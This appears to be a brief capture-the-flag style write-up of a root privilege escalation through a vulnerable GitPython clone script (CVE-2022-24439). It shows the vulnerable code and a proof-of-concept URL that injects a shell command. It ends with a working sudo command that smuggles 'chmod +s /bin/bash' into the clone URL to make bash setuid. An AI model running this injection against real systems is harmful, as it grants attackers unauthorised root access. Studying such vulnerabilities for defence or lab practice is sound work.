```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

Vulnerable Line

```python
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])

# url_to_clone => user input => injection point
# r.clone_from => vulnerable function (CVE-2022-24439) (GitPython < 3.1.30)
```

CVE-2022-24439

```
POC: <gitpython::clone> 'ext::sh -c touch% /tmp/pwned'
FINAL: sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c /usr/bin/chmod% +s% /bin/bash"
```
